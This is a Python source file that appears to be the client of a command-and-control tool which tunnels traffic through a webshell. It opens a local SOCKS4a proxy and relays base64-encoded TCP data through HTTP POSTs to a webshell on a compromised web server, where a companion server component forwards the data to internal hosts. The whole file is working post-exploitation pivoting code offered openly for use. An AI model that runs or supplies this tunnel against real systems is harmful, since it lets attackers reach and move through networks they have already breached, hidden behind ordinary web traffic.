# -*- coding: utf-8 -*-
# @File  : client.py
# @Date  : 2019/8/28
# @Desc  :

#
#

import argparse
import struct
import threading

import ipaddr

from MODULES_DATA.CommandAndControl_MultibandCommunication_Socks5ByWebshell.config import *

try:
    from socketserver import BaseRequestHandler
    from socketserver import ThreadingTCPServer
    import configparser as conp
except Exception as E:
    from SocketServer import BaseRequestHandler
    from SocketServer import ThreadingTCPServer
    import ConfigParser as conp
import time
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

global globalClientCenter


class ClientCenter(threading.Thread):
    def __init__(self):
        self.CACHE_CONNS = {}
        # {
        #     "conn": self.request,
        #     "targetaddr": TARGET_ADDR,
        #     "new": True,
        # }
        # socket参数
        self.LOCAL_ADDR = None
        self.READ_BUFF_SIZE = 51200
        # 日志参数
        self.LOG_LEVEL = "INFO"
        self.logger = get_logger(level=self.LOG_LEVEL, name="StreamLogger")
        # webshell参数
        self.SLEEP_TIME = 0.01
        self.WEBSHELL = None
        self.REMOTE_SERVER = None
        # 缓存变量
        self.die_client_address = []
        self.session = requests.session()
        threading.Thread.__init__(self)

    def _post_data(self, url, data={}):
        payload = {
            "Remoteserver": self.REMOTE_SERVER,
            "Endpoint": url,
            "SENDDATA": newDumps(data)
        }
        self.logger.debug(payload)
        try:
            # timeout 要大于脚本中post的超时时间
            headers = {'Connection': 'keep-alive'}
            r = self.session.post(self.WEBSHELL, data=payload, verify=False, timeout=15, headers=headers)

        except Exception as E:
            self.logger.warning("Post data to WEBSHELL failed")
            self.logger.exception(E)
            return None
        try:
            web_return_data = newLoads(r.content)
            if isinstance(web_return_data, dict) and web_return_data.get(ERROR_CODE) is not None:
                self.logger.error(web_return_data.get(ERROR_CODE))
                self.logger.warning(r.content)
                return None
            else:
                return web_return_data
        except Exception as E:
            self.logger.warning("WEBSHELL return wrong data")
            return None

    def run(self):
        self.logger.warning("LoopThread start")
        while True:
            self._sync_data()
            time.sleep(self.SLEEP_TIME)

    def _sync_data(self):
        post_send_data = {}
        # 清除无效的client

        for client_address in self.die_client_address:
            try:
                one = self.CACHE_CONNS.pop(client_address)
                one.get("conn").close()
                self.logger.warning("CLIENT_ADDRESS:{} close client in die_client_address".format(client_address))
            except Exception as E:
                self.logger.warning(
                    "CLIENT_ADDRESS:{} close client close client in die_client_address error".format(client_address))

        # 从tcp中读取数据
        for client_address in list(self.CACHE_CONNS.keys()):
            client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
            try:
                tcp_recv_data = client_socket_conn.recv(self.READ_BUFF_SIZE)
                self.logger.debug("CLIENT_ADDRESS:{} TCP_RECV_DATA:{}".format(client_address, tcp_recv_data))
                if len(tcp_recv_data) > 0:
                    self.logger.info("CLIENT_ADDRESS:{} TCP_RECV_LEN:{}".format(client_address, len(tcp_recv_data)))
            except Exception as err:
                tcp_recv_data = b""
                self.logger.debug("TCP_RECV_NONE")
            # 编码问题,data数据(tcp传输的数据)需要额外再base64编码一次
            client_socket_targetaddr = self.CACHE_CONNS.get(client_address).get("targetaddr")

            # 每一个client_address的数据结构体
            client_address_one_data = {
                "data": base64.b64encode(tcp_recv_data),
                "targetaddr": client_socket_targetaddr,
            }
            post_send_data[client_address] = client_address_one_data

        # 发送读取的数据到服务器
        payload = {}
        payload[DATA_TAG] = post_send_data  # 发送的数据
        payload[DIE_CLIENT_ADDRESS_TAG] = self.die_client_address  # 需要清除的连接

        post_return_data = self._post_data(URL_STINGER_SYNC, data=payload)
        # 处理post返回数据
        if post_return_data is None:
            time.sleep(3)
            return

        self.die_client_address = []

        for client_address in list(post_return_data.keys()):
            # 读取server返回的数据
            try:
                client_socket_conn = self.CACHE_CONNS.get(client_address).get("conn")
                server_tcp_send_data = base64.b64decode(post_return_data.get(client_address).get("data"))
            except Exception as E:
                self.logger.warning("CLIENT_ADDRESS:{} server socket not in client socket list".format(client_address))
                self.die_client_address.append(client_address)
                continue
            # 将返回的数据发送到client Tcp连接中

            if server_tcp_send_data == "":
                # 无数据返回继续
                continue

            try:
                client_socket_conn.send(server_tcp_send_data)
                self.logger.debug("CLIENT_ADDRESS:{} TCP_SEND_DATA:{}".format(client_address, server_tcp_send_data))
            except Exception as E:
                self.logger.warning("CLIENT_ADDRESS:{} Client socket send failed".format(client_address))
                self.die_client_address.append(client_address)
                try:
                    self.CACHE_CONNS.pop(client_address)
                    client_socket_conn.close()
                except Exception as E:
                    pass

        # 检查没有在server返回列表中的client

        for client_address in list(self.CACHE_CONNS.keys()):
            if post_return_data.get(client_address) is None:
                if self.CACHE_CONNS.get(client_address).get("new") is True:
                    self.CACHE_CONNS[client_address]["new"] = False
                    pass
                else:
                    self.logger.warning(
                        "CLIENT_ADDRESS:{} remove client not in server CHCHE_CONNS".format(client_address)
                    )
                    self.logger.warning("CLIENT_ADDRESS:{} append in die_client_address".format(client_address))
                    self.die_client_address.append(client_address)

    def setc_webshell(self, WEBSHELL):
        try:
            r = requests.get(WEBSHELL, verify=False, timeout=3)
            if b"stinger" in r.content:
                self.WEBSHELL = WEBSHELL
                return True
            else:
                return False
        except Exception as E:
            return False

    def setc_remoteserver(self, REMOTE_SERVER=None):
        if REMOTE_SERVER is None:
            for port in CONTROL_PORT:
                for i in range(2):
                    self.REMOTE_SERVER = "http://{}:{}".format(LOCALADDR, port)
                    result = self._post_data(URL_CHECK)
                    if result is None:  # 失败回退
                        self.REMOTE_SERVER = None
                        continue
                    else:
                        return result
            return None
        self.REMOTE_SERVER = REMOTE_SERVER
        result = self._post_data(URL_CHECK)
        if result is None:  # 失败回退
            self.REMOTE_SERVER = None
        return result

    def setc_localaddr(self, ip, port):
        if port_is_used(port, ip):
            return False
        else:
            self.LOCAL_ADDR = "{}:{}".format(ip, port)
        return True

    def sets_config(self, tag, data):
        payload = {CONFIG_TAG: tag, CONFIG_DATA: data}
        web_return_data = self._post_data(URL_SET_CONFIG, payload)
        return web_return_data

    def send_cmd(self, tag, data=None):
        payload = {CONFIG_TAG: tag, CONFIG_DATA: data}
        web_return_data = self._post_data(URL_CMD, payload)
        return web_return_data


def build_socks_reply(cd, dst_port=0x0000, dst_ip='0.0.0.0'):
    '''
    Build a SOCKS4 reply with the specified reply code, destination port and
    destination ip.
    '''
    # dst_ip_bytes = ipaddress.IPv4Address(dst_ip).packed
    dst_ip_bytes = ipaddr.IPv4Address(dst_ip).packed

    dst_ip_raw, = struct.unpack('>L', dst_ip_bytes)

    return struct.pack('>BBHL', SERVER_VN, cd, dst_port, dst_ip_raw)


class ClientRequest(object):
    '''Represents a client SOCKS4 request'''

    def __init__(self, data):
        '''Construct a new ClientRequeset from the given raw SOCKS request'''
        self.invalid = False

        # Client requests must be at least 9 bytes to hold all necessary data
        if len(data) < 9:
            self.invalid = True
            return

        # Version number (VN)
        self.parse_vn(data)

        # SOCKS command code (CD)
        self.parse_cd(data)

        # Destination port
        self.parse_dst_port(data)

        # Destination IP / Domain name (if specified)
        self.parse_ip(data)

        # Userid
        self.parse_userid(data)

    @classmethod
    def parse_fixed(cls, data):
        '''Parse and return the fixed-length part of a SOCKS request
        Returns a tuple containing (vn, cd, dst_port, dst_ip) given the raw
        socks request
        '''
        return struct.unpack('>BBHL', data[:8])

    def parse_vn(self, data):
        '''Parse and store the version number given the raw SOCKS request'''
        vn, _, _, _ = ClientRequest.parse_fixed(data)
        if (vn != CLIENT_VN):
            self.invalid = True

    def parse_dst_port(self, data):
        '''Parse and store the destination port given the raw SOCKS request'''
        _, _, dst_port, _ = ClientRequest.parse_fixed(data)
        self.dst_port = dst_port

    def parse_cd(self, data):
        '''Parse and store the request code given the raw SOCKS request'''
        _, cd, _, _ = ClientRequest.parse_fixed(data)
        if (cd == REQUEST_CD_CONNECT or cd == REQUEST_CD_BIND):
            self.cd = cd
        else:
            self.invalid = True

    def parse_ip(self, data):
        '''Parse and store the destination ip given the raw SOCKS request
        If the IP is of the form 0.0.0.(1-255), attempt to resolve the domain
        name specified, then store the resolved ip as the destination ip.
        '''
        _, _, _, dst_ip = ClientRequest.parse_fixed(data)

        ip = ipaddr.IPv4Address(dst_ip)
        o1, o2, o3, o4 = ip.packed

        # Invalid ip address specifying that we must resolve the domain
        # specified in data (As specified in SOCKS4a)
        if (o1, o2, o3) == (0, 0, 0) and o4 != 0:
            try:
                # Variable length part of the request containing the userid
                # and domain (8th byte onwards)
                userid_and_domain = data[8:]

                # Extract the domain to resolve
                _, domain, _ = userid_and_domain.split(b'\x00')

            except ValueError:
                # Error parsing request
                self.invalid = True
                return

            try:
                resolved_ip = socket.gethostbyname(domain)
            except socket.gaierror:
                # Domain name not found
                self.invalid = True
                return

            self.dst_ip = resolved_ip

        else:
            self.dst_ip = ip.exploded

    def parse_userid(self, data):
        '''Parse and store the userid given the raw SOCKS request'''
        try:
            index = data.index(b'\x00')
            self.userid = data[8:index]
        except ValueError:
            self.invalid = True
        except IndexError:
            self.invalid = True

    def isInvalid(self):
        '''Returns true if this request is invalid, false otherwise'''
        return self.invalid


class Socks4aProxy(threading.Thread):
    '''A SOCKS4a Proxy'''

    def __init__(self, host="127.0.0.1", port=-1, timeout=0.05, bufsize=BUFSIZE):
        '''Create a new SOCKS4 proxy on the specified port'''

        self._host = host
        self._port = port
        self._bufsize = bufsize
        self._backlog = BACKLOG
        self._timeout = timeout
        self.logger = logging.getLogger("StreamLogger")
        threading.Thread.__init__(self)

    def run(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((self._host, self._port))
            s.listen(self._backlog)
            self.logger.warning("socks4a server start on {}:{}".format(self._host, self._port))
        except Exception as E:
            self.logger.exception(E)
            sys.exit(1)

        while True:
            try:
                self.logger.warning("Socks4a ready to accept")
                conn, addr = s.accept()
                conn.settimeout(self._timeout)
                data = conn.recv(self._bufsize)
                # Got a connection, Handle it with process_request()
                self._process_request(data, conn, addr)
                self.logger.warning("Socks4a process_request finish")
            except KeyboardInterrupt as ki:
                self.logger.warning('Caught KeyboardInterrupt, exiting')
                s.close()
                sys.exit(0)
            except Exception as E:
                self.logger.exception(E)
                try:
                    conn.close()
                except Exception as E:
                    pass

    def _process_request(self, data, client_conn, addr):
        '''Process a general SOCKS request'''

        client_request = ClientRequest(data)

        # Handle invalid requests
        if client_request.isInvalid():
            client_conn.send(build_socks_reply(RESPONSE_CD_REQUEST_REJECTED))
            client_conn.close()
            return

        if client_request.cd == REQUEST_CD_CONNECT:
            globalClientCenter.logger.warning('Got connection from {}'.format(addr))
            key = "{}:{}".format(addr[0], addr[1])
            globalClientCenter.CACHE_CONNS[key] = {
                "conn": client_conn,
                "targetaddr": (client_request.dst_ip, client_request.dst_port),
                "new": True,  # 新的连接,第一次检查略过
            }

            client_conn.settimeout(self._timeout)
            client_conn.send(build_socks_reply(RESPONSE_CD_REQUEST_GRANTED))  # 处理完成,开始正式连接
        else:
            self.logger.warning("Socks4a do not support bind request")


if __name__ == '__main__':

    parser = argparse.ArgumentParser(
        description="Make sure the stinger_server is running on webserver(stinger_server will listen 127.0.0.1:50010 127.0.0.1:60010)")
    parser.add_argument('-w', '--webshell', metavar='http://192.168.3.10:8080/proxy.jsp',
                        help="webshell url",
                        required=True)
    parser.add_argument('-l', '--locallistenaddress', metavar='127.0.0.1/0.0.0.0',
                        help="local listen address for socks5",
                        required=True)
    parser.add_argument('-p', '--port',
                        default=60000,
                        metavar='N',
                        type=int,
                        help="local listen port for socks5.",
                        )

    parser.add_argument('-c', '--cleansockst', default=False,
                        nargs='?',
                        metavar="true",
                        type=bool,
                        help="clean server exist socket(this will kill other client connect)",
                        )
    parser.add_argument('-st', '--sockettimeout', default=0.05,
                        metavar="N",
                        type=float,
                        help="socket timeout value,",
                        )
    parser.add_argument('--sleeptime', default=0.01,
                        metavar="N",
                        type=float,
                        help="sleep time between every post request",
                        )
    args = parser.parse_args()
    WEBSHELL = args.webshell
    LISTEN_ADDR = args.locallistenaddress
    LISTEN_PORT = args.port

    CLEAN_SOCKET = args.cleansockst
    if CLEAN_SOCKET is not False:
        CLEAN_SOCKET = True
    else:
        CLEAN_SOCKET = False

    globalClientCenter = ClientCenter()
    flag = globalClientCenter.setc_localaddr(LISTEN_ADDR, LISTEN_PORT)
    if flag:
        globalClientCenter.logger.info("Local listen check pass.")
        globalClientCenter.logger.info("Socks4a on {}:{}".format(LISTEN_ADDR, LISTEN_PORT))

    else:
        globalClientCenter.logger.error(
            "Local listen check failed, please check if {}:{} is available".format(LISTEN_ADDR, LISTEN_PORT))
        globalClientCenter.logger.error(WEBSHELL)

    webshell_alive = globalClientCenter.setc_webshell(WEBSHELL)
    if webshell_alive:
        globalClientCenter.logger.info("WEBSHELL check pass.")
        globalClientCenter.logger.info(WEBSHELL)
    else:
        globalClientCenter.logger.error("WEBSHELL check failed!")
        globalClientCenter.logger.error(WEBSHELL)
        sys.exit(1)

    result = globalClientCenter.setc_remoteserver()
    if result is None:
        globalClientCenter.logger.error("Read REMOTE_SERVER failed,please check whether server is running")
        sys.exit(1)
    else:
        globalClientCenter.logger.info("REMOTE_SERVER check pass.")
        globalClientCenter.logger.info("--- Sever Config ---")
        for key in result:
            globalClientCenter.logger.info("{} => {}".format(key, result.get(key)))

    if CLEAN_SOCKET:
        flag = globalClientCenter.send_cmd("CLEAN_SOCKET")
        globalClientCenter.logger.info("CLEAN_SOCKET cmd : {}".format(flag))

    sockettimeout = args.sockettimeout
    if sockettimeout != DEFAULT_SOCKET_TIMEOUT:
        flag = globalClientCenter.sets_config("SOCKET_TIMEOUT", sockettimeout)
        globalClientCenter.logger.info("Set server SOCKET_TIMEOUT : {}".format(flag))

    sleeptime = args.sleeptime
    globalClientCenter.SLEEP_TIME = sleeptime
    globalClientCenter.logger.info("SLEEP_TIME : {}".format(sleeptime))

    # 启动服务
    globalClientCenter.setDaemon(True)

    t2 = Socks4aProxy(host=args.locallistenaddress, port=args.port, timeout=sockettimeout, bufsize=BUFSIZE)
    t2.setDaemon(True)

    globalClientCenter.start()
    t2.start()

    # 处理结束信号

    while True:
        try:
            time.sleep(10)
        except KeyboardInterrupt as ki:
            print('Caught KeyboardInterrupt, exiting')
            sys.exit(1)
